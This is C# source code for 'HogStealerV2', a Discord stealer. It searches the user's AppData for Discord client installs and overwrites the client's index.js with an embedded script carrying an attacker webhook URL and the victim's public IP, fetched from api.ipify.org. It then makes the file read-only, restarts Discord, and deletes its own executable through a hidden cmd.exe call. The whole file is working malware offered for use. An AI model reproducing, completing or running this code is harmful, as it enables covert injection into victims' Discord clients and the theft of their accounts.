using HogStealerV2.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace HogStealerV2 //2.1
{
    static class Program
    {
        enum Builds
        {
            discord,
            discordptb,
            discordcanary,
            BetterDiscord
        }
        static void Main(string[] args)
        {
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Builds.discord))
            {
                Find(Builds.discord.ToString());
            }
            else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Builds.discordptb))
            {
                Find(Builds.discordptb.ToString());
            }
            else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Builds.discordcanary))
            {
                Find(Builds.discordcanary.ToString());
            }
            else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Builds.BetterDiscord))
            {
                Find(Builds.BetterDiscord.ToString());
            }
            else
            {
                Melt();
            }
        }
        static void Find(string version)
        {
            var f = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"\\"+version, "index.js", SearchOption.AllDirectories);
            foreach (string i in f)
            {
                if (i.Contains("\\discord_modules\\"))
                {
                    Mod(i);
                }
            }
        }
        static void Mod(string i)
        {
           try
            {
                var wc = new WebClient();
                string IP = wc.DownloadString("http://api.ipify.org/"); //CORS won't let me do it in discord.
                Thread.Sleep(250);
                string i1 = Resources.index.Replace("Unavailable IP!", IP);
                string i2w = i1.Replace("%HOOKURL%", Config.HookURL);
                FileInfo jsinfo = new FileInfo(i);
                bool RO = jsinfo.IsReadOnly;
                if (RO)
                {
                    FileInfo js = new FileInfo(i)
                    {
                        IsReadOnly = false
                    };
                }
                if (Config.RestartDiscord) { foreach (var discord in Process.GetProcessesByName("Discord")) { discord.Kill(); } }
                File.WriteAllText(i, i2w);
                Thread.Sleep(100);
                File.SetAttributes(i, FileAttributes.ReadOnly);
                if (Config.RestartDiscord) { o(); }
                Thread.Sleep(500);
                Melt();
            }
            catch { }
        }
        static void o()
        {
            try
            {
                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk");
                // Discord only runs from the shortcut idk why.
            }
            catch { }
        }
        static void Melt()
        {
            ProcessStartInfo Melt = null;
            try
            {
                Melt = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule.FileName + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };
            }
            catch { }
            finally
            {
                Process.Start(Melt);
                Environment.Exit(0);
            }
        }
    }
}
